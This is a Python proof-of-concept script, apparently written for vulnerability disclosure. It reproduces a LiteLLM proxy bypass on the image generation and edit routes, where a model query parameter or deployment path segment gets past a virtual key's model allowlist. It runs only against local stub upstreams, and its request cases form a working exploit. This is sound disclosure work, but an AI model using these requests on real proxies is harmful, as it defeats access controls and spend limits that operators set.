#!/usr/bin/env python3
"""Reproduce LiteLLM virtual-key model allowlist bypass on the image routes.

Pinned target: BerriAI/litellm cfe0100e1fca613e7b1af27dd1fe4807ca4d1d1a
(1.108.0, 2026-10-26). The rig starts a real LiteLLM proxy with a real
PostgreSQL-backed virtual key restricted to ``allowed-model``, plus two
deterministic OpenAI-compatible upstreams. It then sends the image requests
five times per case and records the exact client and upstream bytes.

The bypass is the same class as BerriAI/litellm#41810, but on
``/v1/images/generations`` and ``/v1/images/edits``: the handlers bind a
``model`` query parameter (or the ``{model:path}`` deployment segment) and
``resolve_inference_model`` prefers it over the body model, while auth only
checks the body model. The open fix PR #41852 covers chat/completions,
completions, embeddings and ``/queue/chat/completions`` only; it does not touch
the image endpoints.

Run with the same Python environment that can run the pinned checkout, e.g.:

    PYTHONPATH=/path/to/litellm \\
    DATABASE_URL=postgresql://user@127.0.0.1:5432/litellm_repro \\
    PRISMA_QUERY_ENGINE_BINARY=/path/to/query-engine-darwin-arm64 \\
    /path/to/venv/bin/python transcripts/098/reproduce.py \\
      --litellm-source /path/to/litellm

The database must already have the LiteLLM schema (run the proxy once against
it). No provider credentials are used; the upstreams are loopback stubs.
"""

import argparse
import base64
import http.client
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import time
import tomllib

HOST = "127.0.0.1"
RUNS = 5
MASTER_KEY = "sk-kairo-098-master"
SALT_KEY = "sk-kairo-098-salt"
TINY_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+ip1sAAAAASUVORK5CYII="
)
EXPECTED_COMMIT = "cfe0100e1fca613e7b1af27dd1fe4807ca4d1d1a"

CASES = [
    {
        "name": "gen_body_denied",
        "kind": "gen",
        "path": "/v1/images/generations",
        "body": {"model": "denied-model", "prompt": "a red cube"},
        "status": 403,
        "served": None,
        "upstream": None,
    },
    {
        "name": "gen_query_denied",
        "kind": "gen",
        "path": "/v1/images/generations?model=denied-model",
        "body": {"model": "allowed-model", "prompt": "a red cube"},
        "status": 200,
        "served": "DENIED",
        "upstream": "denied",
    },
    {
        "name": "gen_deploy_denied",
        "kind": "gen",
        "path": "/openai/deployments/denied-model/images/generations",
        "body": {"model": "allowed-model", "prompt": "a red cube"},
        "status": 200,
        "served": "DENIED",
        "upstream": "denied",
    },
    {
        "name": "gen_query_denied_nobody",
        "kind": "gen",
        "path": "/v1/images/generations?model=denied-model",
        "body": {"prompt": "a red cube"},
        "status": 403,
        "served": None,
        "upstream": None,
    },
    {
        "name": "gen_deploy_denied_nobody",
        "kind": "gen",
        "path": "/openai/deployments/denied-model/images/generations",
        "body": {"prompt": "a red cube"},
        "status": 403,
        "served": None,
        "upstream": None,
    },
    {
        "name": "gen_query_allowed",
        "kind": "gen",
        "path": "/v1/images/generations?model=allowed-model",
        "body": {"model": "allowed-model", "prompt": "a red cube"},
        "status": 200,
        "served": "ALLOWED",
        "upstream": "allowed",
    },
    {
        "name": "gen_no_query",
        "kind": "gen",
        "path": "/v1/images/generations",
        "body": {"model": "allowed-model", "prompt": "a red cube"},
        "status": 200,
        "served": "ALLOWED",
        "upstream": "allowed",
    },
    {
        "name": "edit_body_denied",
        "kind": "edit",
        "path": "/v1/images/edits",
        "body": {"model": "denied-model", "prompt": "make it blue"},
        "status": 403,
        "served": None,
        "upstream": None,
    },
    {
        "name": "edit_query_denied",
        "kind": "edit",
        "path": "/v1/images/edits?model=denied-model",
        "body": {"model": "allowed-model", "prompt": "make it blue"},
        "status": 200,
        "served": "DENIED",
        "upstream": "denied",
    },
    {
        "name": "edit_deploy_denied",
        "kind": "edit",
        "path": "/openai/deployments/denied-model/images/edits",
        "body": {"model": "allowed-model", "prompt": "make it blue"},
        "status": 200,
        "served": "DENIED",
        "upstream": "denied",
    },
    {
        "name": "edit_no_query",
        "kind": "edit",
        "path": "/v1/images/edits",
        "body": {"model": "allowed-model", "prompt": "make it blue"},
        "status": 200,
        "served": "ALLOWED",
        "upstream": "allowed",
    },
]


class ReproductionError(Exception):
    pass


def require(condition, message):
    if not condition:
        raise ReproductionError(message)


def free_port():
    with socket.socket() as sock:
        sock.bind((HOST, 0))
        return sock.getsockname()[1]


def multipart_body(fields, boundary):
    chunks = []
    for name, value in fields.items():
        if name == "image":
            chunks.append(
                (
                    (
                        "--%s\r\n"
                        'Content-Disposition: form-data; name="image"; filename="tiny.png"\r\n'
                        "Content-Type: image/png\r\n\r\n"
                    )
                    % boundary
                ).encode("ascii")
            )
            chunks.append(TINY_PNG)
            chunks.append(b"\r\n")
        else:
            chunks.append(
                (
                    (
                        "--%s\r\n"
                        'Content-Disposition: form-data; name="%s"\r\n\r\n'
                        "%s\r\n" % (boundary, name, value)
                    )
                ).encode("ascii")
            )
    chunks.append(("--%s--\r\n" % boundary).encode("ascii"))
    return b"".join(chunks)


def build_request(case):
    if case["kind"] == "gen":
        body = json.dumps(case["body"], separators=(",", ":")).encode("utf-8")
        content_type = "application/json"
    else:
        boundary = "----kairo098boundary"
        fields = dict(case["body"])
        fields["image"] = ""
        body = multipart_body(fields, boundary)
        content_type = "multipart/form-data; boundary=%s" % boundary
    return body, content_type


def raw_request(method, path, headers, body):
    lines = ["%s %s HTTP/1.1" % (method, path)]
    for name, value in headers:
        lines.append("%s: %s" % (name, value))
    head = "\r\n".join(lines).encode("latin-1") + b"\r\n\r\n"
    return head + body


def raw_response(status, reason, headers, body):
    lines = ["HTTP/1.1 %d %s" % (status, reason)]
    for name, value in headers:
        lines.append("%s: %s" % (name, value))
    return ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + body


def redact_request(raw, key):
    return raw.replace(key.encode(), b"<VIRTUAL_KEY>")


def redact_multipart(raw):
    marker = b"Content-Type: image/png\r\n\r\n"
    start = raw.find(marker)
    if start < 0:
        return raw
    start += len(marker)
    end = raw.find(b"\r\n--", start)
    if end < 0:
        return raw
    return raw[:start] + b"<TINY_PNG 68 bytes>" + raw[end:]


def request(port, method, path, headers, body, timeout=60):
    connection = http.client.HTTPConnection(HOST, port, timeout=timeout)
    try:
        connection.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        for name, value in headers:
            connection.putheader(name, value)
        connection.endheaders(body)
        response = connection.getresponse()
        payload = response.read()
        return {
            "status": response.status,
            "reason": response.reason,
            "headers": response.getheaders(),
            "body": payload,
        }
    finally:
        connection.close()


def read_new_lines(path, offset):
    if not path.exists():
        return [], offset
    with open(path, "r", encoding="utf-8") as handle:
        handle.seek(offset)
        lines = [json.loads(line) for line in handle if line.strip()]
        return lines, handle.tell()


def served_label(payload):
    try:
        document = json.loads(payload)
    except Exception:
        return None
    data = document.get("data")
    if not isinstance(data, list) or not data:
        return None
    prompt = data[0].get("revised_prompt") if isinstance(data[0], dict) else None
    if isinstance(prompt, str) and prompt.startswith("SERVED_BY_") and prompt.endswith("_IMAGE"):
        return prompt[len("SERVED_BY_") : -len("_IMAGE")]
    return None


def wait_for_proxy(port, process, log_path, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if process.poll() is not None:
            raise ReproductionError(
                "proxy exited with %s; see %s" % (process.returncode, log_path)
            )
        try:
            connection = http.client.HTTPConnection(HOST, port, timeout=2)
            connection.request("GET", "/health/liveliness")
            response = connection.getresponse()
            response.read()
            connection.close()
            if response.status == 200:
                return
        except Exception:
            pass
        time.sleep(1)
    raise ReproductionError("proxy did not become healthy within %ss" % timeout)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--litellm-source", default=os.environ.get("LITELLM_SOURCE", ""))
    parser.add_argument("--database-url", default=os.environ.get("DATABASE_URL", ""))
    parser.add_argument(
        "--prisma-query-engine", default=os.environ.get("PRISMA_QUERY_ENGINE_BINARY", "")
    )
    parser.add_argument("--runs", type=int, default=RUNS)
    parser.add_argument("--startup-timeout", type=int, default=300)
    args = parser.parse_args()

    root = Path(__file__).resolve().parent
    source = Path(args.litellm_source).resolve()
    require(source.is_dir(), "--litellm-source is required and must be a directory")
    require(args.database_url, "--database-url or DATABASE_URL is required")
    require(args.prisma_query_engine, "--prisma-query-engine or PRISMA_QUERY_ENGINE_BINARY is required")
    require(Path(args.prisma_query_engine).is_file(), "Prisma query engine not found")
    litellm_bin = Path(sys.executable).with_name("litellm")
    require(litellm_bin.is_file(), "no litellm executable next to the running Python")

    commit = subprocess.run(
        ["git", "-C", str(source), "rev-parse", "HEAD"],
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()
    version = tomllib.loads((source / "pyproject.toml").read_text())["project"]["version"]

    runs_root = root / "runs"
    if runs_root.exists():
        import shutil

        shutil.rmtree(runs_root)
    runs_root.mkdir(parents=True)

    proxy_port = free_port()
    allowed_port = free_port()
    denied_port = free_port()
    while denied_port == allowed_port:
        denied_port = free_port()

    allowed_ledger = root / "upstream-allowed.jsonl"
    denied_ledger = root / "upstream-denied.jsonl"
    for ledger in (allowed_ledger, denied_ledger):
        if ledger.exists():
            ledger.unlink()

    config = root / "config.yaml"
    config.write_text(
        "\n".join(
            [
                "model_list:",
                "  - model_name: allowed-model",
                "    litellm_params:",
                "      model: openai/fake-model",
                "      api_base: http://%s:%d/v1" % (HOST, allowed_port),
                "      api_key: sk-dummy-upstream",
                "  - model_name: denied-model",
                "    litellm_params:",
                "      model: openai/fake-model",
                "      api_base: http://%s:%d/v1" % (HOST, denied_port),
                "      api_key: sk-dummy-upstream",
                "litellm_settings:",
                "  drop_params: true",
                "general_settings:",
                "  master_key: os.environ/LITELLM_MASTER_KEY",
                "",
            ]
        )
    )

    pythonpath = [str(source)]
    for extra in ("litellm-proxy-extras", "enterprise"):
        candidate = source / extra
        if candidate.is_dir():
            pythonpath.append(str(candidate))

    base_env = {
        "HOME": os.environ.get("HOME", ""),
        "PATH": str(Path(sys.executable).parent) + os.pathsep + os.environ.get("PATH", ""),
        "PYTHONPATH": os.pathsep.join(pythonpath),
        "LITELLM_LOCAL_MODEL_COST_MAP": "True",
        "LITELLM_MASTER_KEY": MASTER_KEY,
        "LITELLM_SALT_KEY": SALT_KEY,
        "DATABASE_URL": args.database_url,
        "PRISMA_QUERY_ENGINE_BINARY": args.prisma_query_engine,
    }

    proxy_log = root / "proxy.log"
    allowed_proc = denied_proc = proxy_proc = None
    summary = {
        "target": "BerriAI/litellm",
        "commit": commit,
        "version": version,
        "expected_commit": EXPECTED_COMMIT,
        "recorded_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "runs": args.runs,
        "cases": {},
    }
    try:
        with open(proxy_log, "w", encoding="utf-8") as log_handle:
            allowed_proc = subprocess.Popen(
                [sys.executable, str(root / "upstream.py"), str(allowed_port), "ALLOWED", str(allowed_ledger)],
                env=base_env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.STDOUT,
            )
            denied_proc = subprocess.Popen(
                [sys.executable, str(root / "upstream.py"), str(denied_port), "DENIED", str(denied_ledger)],
                env=base_env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.STDOUT,
            )
            proxy_proc = subprocess.Popen(
                [
                    str(litellm_bin),
                    "--config",
                    str(config),
                    "--host",
                    HOST,
                    "--port",
                    str(proxy_port),
                    "--num_workers",
                    "1",
                ],
                env=base_env,
                stdout=log_handle,
                stderr=subprocess.STDOUT,
            )
            wait_for_proxy(proxy_port, proxy_proc, proxy_log, args.startup_timeout)

        key_alias = "kairo-098-%d" % int(time.time())
        key_body = json.dumps({"models": ["allowed-model"], "key_alias": key_alias}).encode()
        key_response = request(
            proxy_port,
            "POST",
            "/key/generate",
            [
                ("Host", "%s:%d" % (HOST, proxy_port)),
                ("Authorization", "Bearer %s" % MASTER_KEY),
                ("Content-Type", "application/json"),
                ("Content-Length", str(len(key_body))),
            ],
            key_body,
        )
        require(key_response["status"] == 200, "key/generate failed: %s" % key_response["body"][:300])
        virtual_key = json.loads(key_response["body"])["key"]
        (root / "key-metadata.json").write_text(
            json.dumps({"models": ["allowed-model"], "key_alias": key_alias}, indent=2) + "\n"
        )

        for run_number in range(1, args.runs + 1):
            run_dir = runs_root / ("run-%02d" % run_number)
            run_dir.mkdir()
            run_results = []
            for case in CASES:
                case_dir = run_dir / case["name"]
                case_dir.mkdir()
                body, content_type = build_request(case)
                headers = [
                    ("Host", "%s:%d" % (HOST, proxy_port)),
                    ("Authorization", "Bearer %s" % virtual_key),
                    ("Content-Type", content_type),
                    ("Content-Length", str(len(body))),
                    ("Accept", "application/json"),
                    ("Connection", "close"),
                ]
                allowed_offset = allowed_ledger.stat().st_size if allowed_ledger.exists() else 0
                denied_offset = denied_ledger.stat().st_size if denied_ledger.exists() else 0

                response = request(proxy_port, "POST", case["path"], headers, body)

                allowed_calls, _ = read_new_lines(allowed_ledger, allowed_offset)
                denied_calls, _ = read_new_lines(denied_ledger, denied_offset)

                label = served_label(response["body"])
                expected_upstream = case["upstream"]
                actual_upstreams = []
                if allowed_calls:
                    actual_upstreams.append("allowed")
                if denied_calls:
                    actual_upstreams.append("denied")
                passed = (
                    response["status"] == case["status"]
                    and label == case["served"]
                    and actual_upstreams == ([] if expected_upstream is None else [expected_upstream])
                )

                request_raw = raw_request("POST", case["path"], headers, body)
                if case["kind"] == "edit":
                    request_raw = redact_multipart(request_raw)
                request_raw = redact_request(request_raw, virtual_key)
                response_raw = raw_response(
                    response["status"], response["reason"], response["headers"], response["body"]
                )
                (case_dir / "client-request.http").write_bytes(request_raw)
                (case_dir / "client-response.http").write_bytes(response_raw)
                (case_dir / "upstream-allowed.jsonl").write_text(
                    "".join(json.dumps(entry, sort_keys=True) + "\n" for entry in allowed_calls)
                )
                (case_dir / "upstream-denied.jsonl").write_text(
                    "".join(json.dumps(entry, sort_keys=True) + "\n" for entry in denied_calls)
                )
                result = {
                    "case": case["name"],
                    "path": case["path"],
                    "body_model": case["body"].get("model"),
                    "expected_status": case["status"],
                    "http_status": response["status"],
                    "expected_served": case["served"],
                    "served": label,
                    "expected_upstream": expected_upstream,
                    "upstream_calls": actual_upstreams,
                    "pass": passed,
                }
                (case_dir / "result.json").write_text(json.dumps(result, indent=2) + "\n")
                run_results.append(result)

            (run_dir / "result.json").write_text(json.dumps(run_results, indent=2) + "\n")
            for result in run_results:
                entry = summary["cases"].setdefault(
                    result["case"], {"pass": 0, "total": 0, "served": result["served"], "status": result["http_status"]}
                )
                entry["total"] += 1
                entry["pass"] += 1 if result["pass"] else 0

        (root / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
        print(json.dumps(summary, indent=2))
        if any(entry["pass"] != entry["total"] for entry in summary["cases"].values()):
            raise ReproductionError("one or more cases did not reproduce in every run")
    finally:
        for process in (proxy_proc, allowed_proc, denied_proc):
            if process is not None and process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    process.kill()


if __name__ == "__main__":
    try:
        main()
    except ReproductionError as error:
        print("FAILED: %s" % error, file=sys.stderr)
        raise SystemExit(1)
